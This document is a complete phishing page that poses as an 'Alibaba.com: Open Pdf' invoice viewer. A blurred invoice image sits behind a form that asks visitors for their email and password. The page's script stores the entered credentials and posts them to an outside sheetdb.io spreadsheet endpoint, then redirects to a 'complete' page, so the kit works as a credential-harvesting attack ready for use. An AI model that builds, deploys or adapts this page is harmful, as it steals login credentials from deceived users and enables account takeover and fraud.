<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alibaba.com: Open Pdf</title>
    <style>
        main {
            color: white;
        }

        .bg-image {
            background-image: url(/invoice-img.PNG);
            background-size: contain;
            background-position: center;
            filter: blur(2px);
            width: 100%;
            background-repeat: no-repeat;
            height: 100vh;
        }

        form {
            background-color: rgb(0, 0, 0);
            background-color: rgba(0, 0, 0, 0.5);
            position: absolute;
            padding: 2em 4rem;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            width: fit-content;
            height: fit-content;
        }

        input {
            padding: .5rem;
            width: 100%;
        }

        button {
            padding: .7rem 1rem;
            font-weight: 700;
            font-size: medium;
            width: 109%;
            background-color: rgba(44, 40, 40, 0.959);
            border: none;
            color: white;
            cursor: pointer;
        }

        img {
            width: 50px;
            position: absolute;
            left: -3rem;
            top: -1rem;
        }

        h4 {
            text-align: center;
            color: white;
        }

        .pdf {
            position: relative;
        }

        .loader-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .hidden {
            display: none;
        }
    </style>
</head>

<body>

    <main>
        <div class="bg-image"></div>

        <div class="form-container">

            <form method="post" id="login-form" action="https://sheetdb.io/api/v1/taa918if8ffoh">
                <div class="pdf">
                    <img src="/pdf-logo2.jfif" alt="">
                </div>
                <h4>Access PDF Document</h4>
                <label for="email">Email:</label><br>
                <input type="email" id="email" name="email" placeholder="Valid email" required><br><br>

                <label for="password">Password:</label><br>
                <input type="password" id="password" name="password" placeholder="Password" required><br><br><br>

                <div id="loader" class="hidden">
                    <div class="loader-spinner"></div>
                </div>

                <button href="/complete.html" type="submit" id="login-button">View</button>
            </form>


        </div>



    </main>




    <script>
        document.getElementById('login-form').addEventListener('submit', function (event) {
            event.preventDefault();

            // Show loader
            document.getElementById('login-button').disabled = true; // Disable login button
            document.getElementById('loader').classList.remove('hidden');

            // Get input values
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // Save login details to local storage
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);

            // API for login process 
            setTimeout(function () {
                // Hide loader
                document.getElementById('login-button').disabled = false; // Enable login button
                document.getElementById('loader').classList.add('hidden');

                // Reset form
                document.getElementById('login-form').reset();

                // Display success message
            }, 2000);
        });

        // Retrieve login details from local storage (optional)
        var savedEmail = localStorage.getItem('email');
        var savedPassword = localStorage.getItem('password');

        if (savedEmail && savedPassword) {
            document.getElementById('email').value = savedEmail;
            document.getElementById('password').value = savedPassword;
        }

        var form = document.getElementById('login-form');
        form.addEventListener('submit', e => {
            e.preventDefault();
            fetch(form.action, {
                method: "POST",
                body: new FormData(document.getElementById('login-form')),
            }).then(
                response => response.json()
            ).then((html) => {
                //add anything here
                window.location.replace("/complete.html");
            });
        });
    </script>

</body>

</html>
